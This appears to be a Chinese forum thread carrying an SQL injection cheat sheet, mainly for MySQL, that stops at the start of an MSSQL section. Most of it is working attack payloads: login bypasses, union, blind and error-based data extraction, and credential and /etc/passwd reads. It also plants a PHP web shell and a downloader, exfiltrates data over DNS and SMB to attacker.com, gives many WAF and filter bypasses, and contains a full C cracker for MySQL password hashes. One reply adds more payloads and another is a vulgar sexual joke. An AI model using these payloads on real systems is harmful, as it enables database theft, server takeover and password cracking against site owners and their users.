@@ -1,0 +1,1308 @@
+标记：已将此邮件标记为星标邮件。 取消星标
+温馨提示：腾讯公司不会通过邮件来发布中奖信息。请勿轻信密保、汇款、中奖消息，勿轻易拨打陌生电话。详见反骗术中心。
+ 12 楼D。昨天 13:00
+好东西
+ 11 楼dCat 颓废小猫昨天 11:24
+威武 10 楼CnCxzSec衰仔昨天 10:31
+补充两个报错语句：
+
+
+/news.php?id=1 and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))+--+ 
+
+
+
+
+/news.php?id=1 or+1+group+by+concat(0x5e24,(select%20database()),0x5e24,floor(rand(0)*2))having+min(0)+or+1+--+
+
+
+还有mysql的@@basedir参数，或许mysql的绝对路径，有时能据此推出web绝对路径 9 楼CnCxzSec衰仔昨天 10:13
+这篇看得我血脉喷张！ 8 楼Blueice昨天 09:17
+老白，上次翻译那份屏蔽关键词的也发出来吧，我的好像丢失了 7 楼Blueice昨天 09:15
+龙龙，牛逼啊 6 楼hip昨天 09:07
+good job
+ 5 楼CasperKid7月15日 23:51
+尼玛 龙龙~ 当我基友吧~ 我太想插你菊花了!~ 4 楼youstar7月15日 23:28
+给力，+1 3 楼dcluo □ 7月15日 23:11
+辛苦了
+  2 楼cc7月15日 23:08
+龙龙好给力！
+ 1 楼瞌腄龍7月15日 23:07
+
+By:secdragon
+MySQL
+默认存在的数据库
+mysql 需要root权限读取 
+information_schema 在5以上的版本中存在 
+
+测试是否存在注入方法
+假表示查询是错误的 (MySQL 报错/返回页面与原来不同)
+
+真表示查询是正常的 (返回页面与原来相同)
+共三种情况：
+
+
+字符串查询时：
+
+' 
+
+假 
+'' 真 
+" 假 
+"" 真 
+\ 假 
+\\ 真 
+
+
+数字查询时：
+AND 1 真 
+AND 0 假 
+2-1 返回与1相同代表可能存在问题 
+
+ 
+ 
+登陆时：
+' OR '1 
+' OR 1 -- - 
+" OR "" = " 
+" OR 1 = 1 -- - 
+'=' 
+'LIKE' 
+'=0--+ 
+
+
+
+
+
+例子:
+SELECT * FROM Users WHERE id = '1''';
+SELECT * FROM Users WHERE id = 3-2;
+SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';
+注意: 
+
+
+可以使用很多单双引号，只要是成对出现。
+SELECT * FROM Articles WHERE id = '121'''''''''''''
+引号后的语句会继续执行。
+SELECT '1'''''"" UNION SELECT '2' # 1 and 2
+注释
+下面的符号可以用来注释语句：
+
+# Hash 语法 
+/* C-style 语法 
+-- - SQL 语法 
+;%00 空字节 
+` 反引号 
+
+例子：
+SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';
+SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';
+注意:
+
+The backtick can only be used to end a query when used as an alias.
+测试版本号
+VERSION()
+@@VERSION
+@@GLOBAL.VERSION
+
+例子：
+
+如果版本为5的话，下面例子返回为真。
+SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';
+注意:
+
+windows平台上的mysql查询与linux上返回不同：
+                windows                                                            linux
+                            
+数据库认证信息
+表 mysql.user 
+字段 user, password 
+当前用户 user(), current_user(), current_user, system_user(), session_user() 
+
+例子：
+SELECT current_user;
+SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)
+数据库名
+表 information_schema.schemata, mysql.db 
+字段 schema_name, db 
+当前数据库 database(), schema() 
+
+例子:
+SELECT database();
+SELECT schema_name FROM information_schema.schemata;
+SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
+服务器主机名
+@@HOSTNAME
+
+例子:
+SELECT @@hostname;
+表和字段
+检测字段数
+两种方式：
+
+ORDER BY n+1;
+注意:
+
+让n一直增加直到出现错误页面。
+
+例子:
+查询语句 SELECT username, password, permission FROM Users WHERE id = '1';
+
+1' ORDER BY 1--+ 真 
+1' ORDER BY 2--+ 真 
+1' ORDER BY 3--+ 真 
+1' ORDER BY 4--+ 假- 查询只用了3个字段 
+-1' UNION SELECT 1,2,3--+ 真 
+
+
+
+基于错误查询;
+AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
+注意:
+
+这种方式需要你知道所要查询的表名。
+这种报错方式返回表的字段数，而不是错误的查询语句。
+
+
+Example:
+查询语句 SELECT permission FROM Users WHERE id = 1;
+
+AND (SELECT * FROM Users) = 1 返回Users的字段数
+ 
+
+用discuz的做了个例子。
+
+查询表名
+三种方式：
+Union方式：
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
+
+
+盲注：
+
+
+AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+
+
+报错：
+AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) 
+(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); 
+AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));--
+在5.1.5版本中成功。 
+ 
+
+注意:
+
+MySQL 4版本时用version=9
+MySQL 5版本时用version=10
+查询列名
+Union方式：
+UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+盲注：
+AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+报错：
+AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) 
+(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); 
+AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- 
+
+在5.1.5版本中成功。 
+AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1版本修复了 
+
+
+
+PROCEDURE ANALYSE()方式：
+
+
+注意:
+这个需要web应用展现你所注入查询的第一个字段。
+例子:
+查询语句 SELECT username, permission FROM Users WHERE id = 1;
+
+1 PROCEDURE ANALYSE() 获得第一个段名 
+1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 
+1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名 
+
+一次查询多个表或列
+SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x
+
+例子：
+SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x), 4--+';
+
+输出结果：
+[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME
+[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME
+[ information_schema ] >CHARACTER_SETS > DESCRIPTION
+[ information_schema ] >CHARACTER_SETS > MAXLEN
+[ information_schema ] >COLLATIONS > COLLATION_NAME
+[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME
+[ information_schema ] >COLLATIONS > ID
+[ information_schema ] >COLLATIONS > IS_DEFAULT
+[ information_schema ] >COLLATIONS > IS_COMPILED
+                                                
+
+
+SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
+
+例子：
+SELECT username FROM Users WHERE id = '-1' UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns--+';
+
+输出结果：
+Table: talk_revisions
+Column: revid
+
+Table: talk_revisions
+Column: userid
+
+Table: talk_revisions
+Column: user
+
+Table: talk_projects
+Column: priority
+                                        
+根据列名查询所在的表
+SELECT table_name FROM information_schema.columns WHERE column_name = 'username'; 查询字段为username的表 
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%'; 查询字段中包含user的表 
+
+根据表查询包含的字段
+SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'; 查询user表中的字段 
+SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%'; 查询包含user字符串表中的字段 
+
+绕过引号限制
+SELECT * FROM Users WHERE username = 0x61646D696E Hex编码 
+SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 利用CHAR()函数 
+
+绕过字符串黑名单
+SELECT 'a' 'd' 'mi' 'n'; 
+SELECT CONCAT('a', 'd', 'm', 'i', 'n'); 
+SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n'); 
+SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n'); 
+
+注意:
+
+使用CONCAT()时，任何个参数为null，将返回null， 推荐使用CONCAT_WS() 。
+CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。
+条件语句
+CASE 
+IF() 
+IFNULL() 
+NULLIF() 
+
+例子：
+SELECT IF(1=1, true, false);
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+时间延迟查询
+SLEEP() MySQL 5 
+BENCHMARK() MySQL 4/5 
+
+例子：
+' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
+权限
+文件权限
+下面的语句可以查询用户读写文件操作权限。
+
+SELECT file_priv FROM mysql.user WHERE user = 'username'; 需要root用户来执行 MySQL 4/5 
+SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%'; 普通用户都可以 MySQL 5 
+
+读取文件
+如果用户有文件操作权限可以读取文件。
+
+LOAD_FILE()
+
+例子：
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE(0x2F6574632F706173737764);
+注意：
+
+文件必须在服务器上。
+LOAD_FILE()函数操作文件的当前目录是@@datadir 。
+MySQL用户必须拥有对此文件读取的权限。
+文件大小必须小于 max_allowed_packet。
+@@max_allowed_packet的默认大小是1047552 字节.
+写文件
+
+如果用户有文件操作权限可以写文件。
+INTO OUTFILE/DUMPFILE
+
+例子：
+写一个PHP的shell：
+SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
+
+
+访问如下链接：
+http://localhost/shell.php?c=cat%20/etc/passwd
+写一个下载者：
+SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'
+
+
+访问如下链接：
+http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt
+注意：
+
+INTO OUTFILE 不可以覆盖已存在的文件。
+INTO OUTFILE 必须是最后一个查询。
+没有办法可以编码路径名，所以引号是必须的。
+Out Of Band Channeling
+DNS Requests
+SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\')); 
+
+SMB Requests
+' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt 
+
+PDO堆查询方式操作数据库
+PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。
+
+例子：
+SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username,password,priv) VALUES ('BobbyTables', 'kl20da$$','admin');
+MySQL特有的代码
+MySQL allows you to specify the version number after the exclamation mark. The syntax within the comment is only executed if the version is greater or equal to the specified version number.
+
+
+例子：
+UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+
+SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
+注意：
+
+The first example returns the version; it uses a UNION with 2 columns.
+The second example demonstrates how this can be useful for bypassing a WAF/IDS.
+模糊和混淆
+允许的字符
+下面的字符可以用来做间隔：
+
+09 Horizontal Tab 
+0A New Line 
+0B Vertical Tab 
+0C New Page 
+0D Carriage Return 
+A0 Non-breaking Space 
+20 Space 
+
+例子：
+'%0A%09UNION%0CSELECT%A0NULL%20%23
+
+
+括号也可以用来绕过过滤空格的情况：
+
+28 ( 
+29 ) 
+
+例子：
+UNION(SELECT(column)FROM(table))
+AND或OR后面可以跟的字符
+20 Space 
+2B + 
+2D - 
+7E ~ 
+21 ! 
+40 @ 
+
+例子：
+SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))
+注意：
+
+dual是一个虚拟表，可以用来做测试。
+编码
+编码你的注入语句可能绕过某些WAF或者IDS。
+
+URL编码 SELECT %74able_%6eame FROM information_schema.tables; 
+URL二次编码 SELECT %2574able_%256eame FROM information_schema.tables; 
+Unicode编码 SELECT %u0074able_%u6eame FROM information_schema.tables; 
+无效的Hex 编码(仅限ASP) SELECT %tab%le_%na%me FROM information_schema.tables; 
+
+混淆与注释
+例子：
+1'# 
+AND 0-- 
+UNION# I am a comment! 
+SELECT@tmp:=table_name x FROM-- 
+`information_schema`.tables LIMIT 1# 
+
+URL编码后：
+
+1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table_name x FROM--%0A`information_schema`.tables LIMIT 1%23
+函数也可以用注释或间隔符来混淆：
+
+VERSION/**/%A0 (/*comment*/)
+操作
+AND , && Logical AND 
+= Assign a value (as part of a SET statement, or as part of the SET clause in an UPDATE statement) 
+:= Assign a value 
+BETWEEN ... AND ... Check whether a value is within a range of values 
+BINARY Cast a string to a binary string 
+& Bitwise AND 
+~ Invert bits 
+| Bitwise OR 
+^ Bitwise XOR 
+CASE Case operator 
+DIV Integer division 
+/ Division operator 
+<=> NULL-safe equal to operator 
+= Equal operator 
+>= Greater than or equal operator 
+> Greater than operator 
+IS NOT NULL NOT NULL value test 
+IS NOT Test a value against a boolean 
+IS NULL NULL value test 
+IS Test a value against a boolean 
+<< Left shift 
+<= Less than or equal operator 
+< Less than operator 
+LIKE Simple pattern matching 
+- Minus operator 
+% or MOD Modulo operator 
+NOT BETWEEN ... AND ... Check whether a value is not within a range of values 
+!= , <> Not equal operator 
+NOT LIKE Negation of simple pattern matching 
+NOT REGEXP Negation of REGEXP 
+NOT , ! Negates value 
+|| , OR Logical OR 
++ Addition operator 
+REGEXP Pattern matching using regular expressions 
+>> Right shift 
+RLIKE Synonym for REGEXP 
+SOUNDS LIKE Compare sounds 
+* Multiplication operator 
+- Change the sign of the argument 
+XOR Logical XOR 
+
+常数
+current_user 
+null, \N 
+true, false 
+
+=============================================================
+几个针对黑名单绕过的实例：
+
+
+基于关键字的黑名单：
+过滤关键字 and  or 
+php代码 preg_match('/(and|or)/i',$id) 
+会过滤的攻击代码 1 or 1=1          1 and 1=1 
+绕过方式 1 || 1=1         1 && 1=1 
+
+
+
+下面这种方式你需要已经知道一些表和字段名（可以利用substring函数去一个一个获得information_schema.columns表中的数据）
+过滤关键字 and  or union 
+php代码 preg_match('/(and|or|union)/i',$id) 
+会过滤的攻击代码 union select user,password from users 
+绕过方式 1 && (select user from users where userid=1)='admin' 
+
+
+
+过滤关键字 and  or  union  where 
+php代码 preg_match('/(and|or|union|where)/i',$id) 
+会过滤的攻击代码 1 && (select user from users where user_id = 1) = 'admin' 
+绕过方式 1 && (select user from users limit 1) = 'admin' 
+
+
+过滤关键字 and  or  union  where 
+php代码 preg_match('/(and|or|union|where)/i',$id) 
+会过滤的攻击代码 1 && (select user from users where user_id = 1) = 'admin' 
+绕过方式 1 && (select user from users limit 1) = 'admin' 
+
+
+
+过滤关键字 and, or, union, where, limit 
+php代码 preg_match('/(and|or|union|where|limit)/i', $id) 
+会过滤的攻击代码 1 && (select user from users limit 1) = 'admin' 
+绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'
+#user_id聚合中user_id为1的user为admin 
+
+
+
+过滤关键字 and, or, union, where, limit, group by 
+php代码 preg_match('/(and|or|union|where|limit|group by)/i', $id) 
+会过滤的攻击代码 1 && (select user from users group by user_id having user_id = 1) = 'admin' 
+绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1 
+
+
+
+过滤关键字 and, or, union, where, limit, group by, select 
+php代码 preg_match('/(and|or|union|where|limit|group by|select)/i', $id) 
+会过滤的攻击代码 1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1 
+绕过方式 1 && substr(user,1,1) = 'a' 
+
+
+
+过滤关键字 and, or, union, where, limit, group by, select, ' 
+php代码 preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id) 
+会过滤的攻击代码 1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1 
+绕过方式 1 && user_id is not null
+1 && substr(user,1,1) = 0x61
+1 && substr(user,1,1) = unhex(61) 
+
+
+
+过滤关键字 and, or, union, where, limit, group by, select, ', hex 
+php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id) 
+会过滤的攻击代码 1 && substr(user,1,1) = unhex(61) 
+绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16))
+#十进制的11转化为十六进制，并小写。 
+
+
+
+过滤关键字 and, or, union, where, limit, group by, select, ', hex, substr 
+php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id) 
+会过滤的攻击代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
+绕过方式 1 && lpad(user,7,1) 
+
+
+
+过滤关键字 and, or, union, where, limit, group by, select, ', hex, substr, 空格 
+php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id) 
+会过滤的攻击代码 1 && lpad(user,7,1) 
+绕过方式 1%0b||%0blpad(user,7,1) 
+
+
+
+过滤关键字 and  or  union  where 
+php代码 preg_match('/(and|or|union|where)/i',$id) 
+会过滤的攻击代码 1 || (select user from users where user_id = 1) = 'admin' 
+绕过方式 1 || (select user from users limit 1) = 'admin' 
+
+基于正则的黑名单：
+几种读取表名的方式：
+1 union select 1, table_name from information_schema.tables where table_name = 'users'
+1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'
+1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)
+1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a
+1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273
+几种常规绕过方式：
+php代码 preg_match('/union\sselect/g',$id) 
+绕过方式 http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3-- 
+
+php代码 preg_replace('/(and|union|select)/i', '', $str); 
+绕过方式 http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3-- 
+
+还有很多针对各种WAF规则的绕过。
+http://victim.com/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--
+http://victim.com/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+顺便总结一下各个语言针对一个变量同时传入两个值时的情况。
+如下请求参数 par1=val1&par1=val2各webserver 处理
++-------------------------------------------------------------------------------+
+| ASP.NET/IIS | 加入逗号连接              | par1=val1,val2 |
+| ASP/IIS        | 加入逗号连接              | par1=val1,val2 |
+| PHP/Apache | 取后面一个参数值       | par1=val2 |
+| JSP/Tomcat  | 取前面一个参数值       | par1=val1 |
+| Perl/Apache  |取前面一个参数值        | par1=val1 |
+| DBMan         |加入波浪号连接号连接 | par1=val1~~val2 |
++---------------------------------------------------------------------------------+ 
+参数污染绕过示例（主要是针对asp/iis或asp.net/iis的配置）
+
+
+拦截 : id=1%20or%201=1
+绕过 : id=1/*&id=*/or/*&id=*/1=1
+原理： IIS接收后实际转换为id=1/*， */or/*，*/1=1 
+
+
+RFC 定义字符处理:
+未保留字符 : a-z, A-Z, 0-9 and _ . ! ~ * ' ()
+保留字符 : ; / ? : @ & = + $ ,
+#保留字符是URI中的保留关键字符，它们用于分割URI中的各个部分
+未定义字符 : { } | \ ^ [ ] `
+下面是不同请求处理后结果
+| 请求字符串     | Apache/2.2.16, PHP/5.3.3| IIS6/ASP |
+| ?test[1=2        | test_1=2                         | test[1=2  |
+| ?test=%         | test=%                            | test=      |
+| ?test%00=1    | test=1                             | test=1    |
+| ?test=1%001  | NULL                               | test=1    |
+| ?test=1+1       | test=1 1                          | test=1 1 | 
+%对于asp/asp.net相当于空，so...
++--------------------------------------------------------------------------+
+|      Keywords          |        WAF                      |  ASP/ASP.NET  |
++--------------------------------------------------------------------------+
+| sele%ct * fr%om..  | sele%ct * fr%om..        | select * from..  |
+| ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx       | ;drop table xxx  |
+| <scr%ipt>              | <scr%ipt>                   | <script>           |
+| <if%rame>            | <if%rame>                  | <iframe>         |
++--------------------------------------------------------------------------+
+=============================================================
+利用正则表达式进行盲注
+我们都已经知道，在MYSQL 5+中 information_schema库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下：
+
+1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。
+
+注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*
+
+2. 判断第一个字符是否是a-n中的字符
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*
+
+3. 确定该字符为n
+
+index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*
+
+4. 表达式的更换如下
+
+expression like this:  '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE 
+
+这时说明表名为news ，要验证是否是该表明 正则表达式为'^news$'，但是没这必要 直接判断 table_name = ’news‘ 不就行了。
+
+5.接下来猜解其它表了 只需要修改 limit 1,1 -> limit 2,1就可以对接下来的表进行盲注了。
+
+
+order by后的注入
+oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。
+一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
+原始链接：http://www.test.com/list.php?order=vote  根据vote字段排序。
+找到投票数最大的票数num然后构造以下链接：
+http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc   看排序是否变化。
+还有一种方法不需要知道任何字段信息，使用rand函数：
+http://www.test.com/list.php?order=rand(true)
+http://www.test.com/list.php?order=rand(false)
+以上两个会返回不同的排序，so...判断表名中第一个字符是否小于128的语句如下：
+http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
+
+
+宽字节注入
+sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。
+反斜杠(\)的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，
+%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。
+不止在sql注入中，宽字符注入在很多地方都可以应用。
+=============================================================
+下面是密码hash就不翻译了。
+Password Hashing
+Prior to MySQL 4.1, password hashes computed by the PASSWORD() function are 16 bytes long. Such hashes look like this:
+
+PASSWORD('mypass') 6f8c114b58f2ce9e 
+
+As of MySQL 4.1, the PASSWORD() function has been modified to produce a longer 41-byte hash value:
+
+PASSWORD('mypass') *6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4 
+
+Password Cracker
+Cain & Abel, JTR are capable of cracking MySQL 3.x-6.x passwords.
+
+MySQL < 4.1 Password Cracker
+This tool is a high-speed brute-force password cracker for MySQL hashed passwords. It can break an 8-character password containing any printable ASCII characters in a matter of hours on an ordinary PC.
+
+/* This program is public domain. Share and enjoy.
+*
+* Example:
+* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
+* $ MySQLfast 6294b50f67eda209
+* Hash: 6294b50f67eda209
+* Trying length 3
+* Trying length 4
+* Found pass: barf
+*
+* The MySQL password hash function could be strengthened considerably
+* by:
+* - making two passes over the password
+* - using a bitwise rotate instead of a left shift
+* - causing more arithmetic overflows
+*/
+
+#include 
+
+typedef unsigned long u32;
+
+/* Allowable characters in password; 33-126 is printable ascii */
+#define MIN_CHAR 33
+#define MAX_CHAR 126
+
+/* Maximum length of password */
+#define MAX_LEN 12
+
+#define MASK 0x7fffffffL
+
+int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
+{
+  int i, c;
+  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
+  u32 newstate1, newstate2, newstate3;
+  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
+  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
+  i = -1;
+  sum = 7;
+  state1_ary[0] = 1345345333L;
+  state2_ary[0] = 0x12345671L;
+
+  while (1) {
+    while (i < stop) {
+      i++;
+      pass_ary[i] = MIN_CHAR;
+      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
+      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
+      sum += MIN_CHAR;
+      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
+      state2_ary[i+1] = state2_ary[i]
+        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
+    }
+
+    state1 = state1_ary[i+1];
+    state2 = state2_ary[i+1];
+    step = (state1 & 0x3f) + sum;
+    xor1 = step*MIN_CHAR + (state1 << 8);
+    xor2 = (state2 << 8) ^ state1;
+
+    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
+      newstate2 = state2 + (xor1 ^ xor2);
+      newstate1 = state1 ^ xor1;
+
+      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
+      div = (newstate1 & 0x3f) + sum + c;
+      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
+      if (diff % div != 0) continue;
+      d = diff / div;
+      if (d < MIN_CHAR || d > MAX_CHAR) continue;
+
+      div = (newstate3 & 0x3f) + sum + c + d;
+      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
+      if (diff % div != 0) continue;
+      e = diff / div;
+      if (e < MIN_CHAR || e > MAX_CHAR) continue;
+
+      pass_ary[i+1] = c;
+      pass_ary[i+2] = d;
+      pass_ary[i+3] = e;
+      return 1;
+    }
+
+    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
+      sum -= MAX_CHAR;
+      i--;
+    }
+    if (i < 0) break;
+    pass_ary[i]++;
+    xor_ary[i] += step_ary[i];
+    sum++;
+    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
+    state2_ary[i+1] = state2_ary[i]
+      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
+  }
+
+  return 0;
+}
+
+void crack(char *hash)
+{
+  int i, len;
+  u32 targ1, targ2, targ3;
+  int pass[MAX_LEN];
+
+  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
+    printf("Invalid password hash: %s\n", hash);
+    return;
+  }
+  printf("Hash: %08lx%08lx\n", targ1, targ2);
+  targ3 = targ2 - targ1;
+  targ3 = targ2 - ((targ3 << 8) ^ targ1);
+  targ3 = targ2 - ((targ3 << 8) ^ targ1);
+  targ3 = targ2 - ((targ3 << 8) ^ targ1);
+
+  for (len = 3; len <= MAX_LEN; len++) {
+    printf("Trying length %d\n", len);
+    if ( crack0(len-4, targ1, targ3, pass) ) {
+      printf("Found pass: ");
+      for (i = 0; i < len; i++)
+        putchar(pass[i]);
+      putchar('\n');
+      break;
+    }
+  }
+  if (len > MAX_LEN)
+    printf("Pass not found\n");
+}
+
+int main(int argc, char *argv[])
+{
+  int i;
+  if (argc <= 1)
+    printf("usage: %s hash\n", argv[0]);
+  for (i = 1; i < argc; i++)
+    crack(argv[i]);
+  return 0;
+}
+                                MSSQL
+默认存在的数据库
+pubs MSSQL 2005中不存在了 
+model 所有版本中都有 
+msdb 所有版本中都有 
+tempdb 所有版本中都有 
+northwind 所有版本中都有 
+information_schema MSSQL 2000 或者更高 
+
+注释查询
+下面的字符可以用来注释sql后面的语句。
+
+/* C-style语法 
+-- SQL语法 
+;%00 空字节 
+
+例子：
+
+SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
+SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
+查询版本
+@@VERSION
+
+例子：
+版本为2008的话返回为真
+SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';
+注意：
+
+同时会输出windows的版本。
+数据库认证信息
+数据库表 master..syslogins, master..sysprocesses 
+字段 name, loginame 
+当前用户 user, system_user, suser_sname(), is_srvrolemember('sysadmin') 
+Database Credentials SELECT user, password FROM master.dbo.sysxlogins 
+
+例子：
+查询当前用户：
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+
+
+查询用户是否为admin：
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
+数据库名
+数据库表 master..sysdatabases 
+字段 name 
+当前数据库 DB_NAME(i) 
+
+例子：
+SELECT DB_NAME(5);
+SELECT name FROM master..sysdatabases;
+服务器主机名
+@@SERVERNAME 
+SERVERPROPERTY() 
+
+例子：
+SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
+注意：
+
